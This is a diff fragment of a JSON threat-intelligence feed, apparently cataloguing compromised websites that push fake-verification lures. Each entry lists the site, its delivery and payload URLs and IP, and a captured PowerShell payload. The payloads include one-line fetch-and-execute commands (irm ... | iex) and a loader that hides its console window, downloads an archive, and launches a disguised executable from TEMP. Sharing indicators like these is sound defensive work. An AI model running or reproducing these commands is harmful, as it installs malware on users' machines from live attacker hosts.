+    "ReportId": "cmwaqy0fn02fg0omlwphh4u0i"
+  },
+  {
+    "UrlDomain": "leaseadmin.ca",
+    "DeliveryUrl": [
+      "frclau.com"
+    ],
+    "PayloadUrl": [
+      "https://frclau.com/eoN",
+      "https://leaseadmin.ca/",
+      "https://js-na3.hsforms.net/ui-forms-embed-components-app/frame.html?_hsPortalId=343314582&_hsFormId=e8115fac-216d-4084-8a0d-ad914b3bec99&_hsIsQa=false&_hsHublet=na3&_hsDisableScriptloader=true&_hsDisableRedirect=true&_hsInstanceId=32644b7f-f856-4bdc-996f-bc3551c33dcd"
+    ],
+    "IP": [
+      "77.37.53.171"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://frclau[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://frclau.com/eoN"
+    ],
+    "ReportId": "cmwaqh3zq02au0omlbcebaqu0"
+  },
+  {
+    "UrlDomain": "epmapse.gob.ec",
+    "DeliveryUrl": [
+      "frclau.com"
+    ],
+    "PayloadUrl": [
+      "https://frclau.com/eoN"
+    ],
+    "IP": [
+      "75.102.57.85"
+    ],
+    "Related": [
+      {
+        "Value": "https://frclau.com/ca.js",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "$url = \"https://frclau[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://frclau.com/eoN"
+    ],
+    "ReportId": "cmwaqgcpt029o0omlad0xpp3o"
+  },
+  {
+    "UrlDomain": "www.hallandservice.dukayouthledorganization.org",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "192.250.229.83"
+    ],
+    "Related": [
+      {
+        "Value": "n",
+        "Type": "Hostname"
+      },
+      {
+        "Value": "l",
+        "Type": "Hostname"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/rytu08-74/b61dad-f0cc-45b4-affa-f15a6b6fb779/-/raw/main/611c2C8-1e4B-4d28-AdF2-000Bb7f52B94 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/rytu08-74/b61dad-f0cc-45b4-affa-f15a6b6fb779/-/raw/main/611c2C8-1e4B-4d28-AdF2-000Bb7f52B94"
+    ],
+    "ReportId": "cmwaqfk6e027u0omlrrf8nufh"
+  },
+  {
+    "UrlDomain": "new.dis.sk",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "92.245.30.4"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec"
+    ],
+    "ReportId": "cmwaqbhyx022q0oml78i982wh"
+  },
+  {
+    "UrlDomain": "kurti.fr",
+    "DeliveryUrl": [
+      "t-trustresnew.com"
+    ],
+    "PayloadUrl": [
+      "https://t-trustresnew.com/click/437fcc74237f6eaa"
+    ],
+    "IP": [
+      "109.234.166.207"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://t-trustresnew[.]com/click/437fcc74237f6eaa')|iex",
+    "ResolvedDownloadUrl": [
+      "https://t-trustresnew.com/click/437fcc74237f6eaa"
+    ],
+    "ReportId": "cmwaofa4901pv0oml2dv9jutk"
+  },
+  {
+    "UrlDomain": "productosalimenticiosarucas.es",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "91.108.98.213"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402&_v=29905231",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/e42e22c5e92d53e7'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/e42e22c5e92d53e7"
+    ],
+    "ReportId": "cmwao8o3p01la0omlmotcq335"
+  },
+  {
+    "UrlDomain": "eared.org",
+    "DeliveryUrl": [
+      "t-trustresnew.com"
+    ],
+    "PayloadUrl": [
+      "https://t-trustresnew.com/Girya/c2bb5e53eeac1f49"
+    ],
+    "IP": [
+      "179.43.116.166"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://t-trustresnew[.]com/Girya/c2bb5e53eeac1f49')|iex",
+    "ResolvedDownloadUrl": [
+      "https://t-trustresnew.com/Girya/c2bb5e53eeac1f49"
+    ],
+    "ReportId": "cmwanjbw9018m0omlq3184wsq"
+  },
+  {
+    "UrlDomain": "cbfinestfood.com",
+    "DeliveryUrl": [
+      "t-trustresnew.com"
+    ],
+    "PayloadUrl": [
+      "https://t-trustresnew.com/Girya/7eeb7dc71e67e3f9"
+    ],
+    "IP": [
+      "188.114.97.0"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://t-trustresnew[.]com/Girya/7eeb7dc71e67e3f9')|iex",
+    "ResolvedDownloadUrl": [
+      "https://t-trustresnew.com/Girya/7eeb7dc71e67e3f9"
+    ],
+    "ReportId": "cmwan0j4800yq0omlltp1f36f"
+  },
+  {
+    "UrlDomain": "www.coffeecookers7.com",
+    "DeliveryUrl": [
+      "frclau.com"
+    ],
+    "PayloadUrl": [
+      "https://frclau.com/eoN"
+    ],
+    "IP": [
+      "93.127.179.9"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://frclau[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://frclau.com/eoN"
+    ],
+    "ReportId": "cmwam6zr200qm0omluiv0gc85"
+  },
+  {
+    "UrlDomain": "klybeck.info",
+    "DeliveryUrl": [
+      "t-trustresnew.com"
+    ],
+    "PayloadUrl": [
+      "https://t-trustresnew.com/girya/441fd4a04ee64f1b"
+    ],
+    "IP": [
+      "160.153.0.81"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://t-trustresnew[.]com/Girya/441fd4a04ee64f1b')|iex",
+    "ResolvedDownloadUrl": [
+      "https://t-trustresnew.com/Girya/441fd4a04ee64f1b"
+    ],
+    "ReportId": "cmwalq2qj00ch0omlecjbmf22"
+  },
+  {
+    "UrlDomain": "astrovastualignment.com",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "82.25.120.78"
+    ],
+    "Related": [],
+    "Payload": "irm 'browse-nnccodes.beer/02275e4ee7b11819'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/02275e4ee7b11819"
+    ],
+    "ReportId": "cmwalipbz006w0oml8w01xd4l"
+  },
+  {
+    "UrlDomain": "vinayweb.tech",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer",
+      "makeverizyjar.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "217.21.87.66"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/api.php?s=e10ef8de19605c32100e813253d3d24e5d4bc2d679abf1a5&amp;_v=29905138",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://makeverizyjar.info/api.php?s=e24fc8572d6bb6b800cd73affdfe08d8a0982d40960c32b3&amp;_v=29905138",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/c136798060204bf6'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/c136798060204bf6"
+    ],
+    "ReportId": "cmwakuk2x003w0omlqpskj6p6"
+  },
+  {
+    "UrlDomain": "cambridgeeducare.com",
+    "DeliveryUrl": [
+      "cloudeccentric.cc",
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "151.106.124.146"
+    ],
+    "Related": [],
+    "Payload": "irm 'browse-nnccodes.beer/eeb2a4c9abf0c82b'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/eeb2a4c9abf0c82b"
+    ],
+    "ReportId": "cmwaktkno00240omll6ytk474"
+  },
+  {
+    "UrlDomain": "fastlocksmith.ae",
+    "DeliveryUrl": [
+      "frclau.com"
+    ],
+    "PayloadUrl": [
+      "https://frclau.com/eoN"
+    ],
+    "IP": [
+      "91.108.98.177"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://frclau[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://frclau.com/eoN"
+    ],
+    "ReportId": "cmwaksurb000c0omlqqpruwgo"
+  },
+  {
+    "UrlDomain": "nelixml.com",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer",
+      "base.gateway.tenderly.co"
+    ],
+    "PayloadUrl": [
+      "http://timelevel12.com/big"
+    ],
+    "IP": [
+      "185.104.144.15"
+    ],
+    "Related": [
+      {
+        "Value": "https://base.gateway.tenderly.co",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/b074e2c7926f7791'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/b074e2c7926f7791"
+    ],
+    "ReportId": "cmwaiqqqk00090oml1bqj5y5q"
+  },
+  {
+    "UrlDomain": "www.adegemsvolkstheater.be",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "46.30.213.126"
+    ],
+    "Related": [],
+    "Payload": "irm 'browse-nnccodes.beer/01b5a3d4cceef7ae'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/01b5a3d4cceef7ae"
+    ],
+    "ReportId": "cmwaila5l08ql0omlduekey7c"
+  },
+  {
+    "UrlDomain": "www.sjremodelfinder.com",
+    "DeliveryUrl": [
+      "browse-nnccodes.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "75.119.207.96"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-nnccodes.beer/api.php?s=d337fe5678dbf1893653249a44964fe325f0428d2f4be1ae&amp;_v=29905073",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-nnccodes.beer/252f50fc7c4e57ba'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-nnccodes.beer/252f50fc7c4e57ba"
+    ],
+    "ReportId": "cmwaikzu608q10omllivblirh"
+  },
+  {
+    "UrlDomain": "hbhtexas.com",
+    "DeliveryUrl": [
+      "frclau.com"
+    ],
+    "PayloadUrl": [
+      "https://frclau.com/eoN"
+    ],
+    "IP": [
+      "160.153.0.119"
+    ],
+    "Related": [
+      {
+        "Value": "https://frclau.com/ca.js",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "$url = \"https://frclau[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://frclau.com/eoN"
+    ],
+    "ReportId": "cmwafa1yg08ee0omlkfez3dt8"
+  },
+  {
+    "UrlDomain": "bule6swiss.com",
+    "DeliveryUrl": [
+      "makeverizyjar.info",
+      "lovezramexar.info",
+      "frclau.com"
+    ],
+    "PayloadUrl": [
+      "https://frclau.com/eoN"
+    ],
+    "IP": [
+      "151.243.0.200"
+    ],
+    "Related": [
+      {
+        "Value": "https://makeverizyjar.info/api.php?s=f61eff363d1bbd3db61fbed8769236f8e2a9a4474ca5bda7",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "$url = \"https://frclau[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://frclau.com/eoN"
+    ],
+    "ReportId": "cmwa7uhjs07yx0omlfjdv2k9y"
+  },
+  {
+    "UrlDomain": "propolice.fr",
+    "DeliveryUrl": [
+      "fastly.jsdelivr.net"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "46.105.57.169"
+    ],
+    "Related": [],
+    "Payload": "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
+    "ResolvedDownloadUrl": [
+      "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
+    ],
+    "ReportId": "cmwa78v3607w70omluib5p702"
+  },
+  {
+    "UrlDomain": "grozco.com",
+    "DeliveryUrl": [
+      "fastly.jsdelivr.net"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "195.211.47.67"
+    ],
+    "Related": [],
+    "Payload": "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
+    "ResolvedDownloadUrl": [
+      "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
+    ],
+    "ReportId": "cmw9zizln07hd0oml2za1wlqb"
+  },
+  {
+    "UrlDomain": "2taxi.ir",
+    "DeliveryUrl": [
+      "fastly.jsdelivr.net"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "213.108.240.86"
+    ],
+    "Related": [],
+    "Payload": "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
+    "ResolvedDownloadUrl": [
+      "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
+    ],
+    "ReportId": "cmw9xznov07gc0omlfempg6ha"
+  }
+]
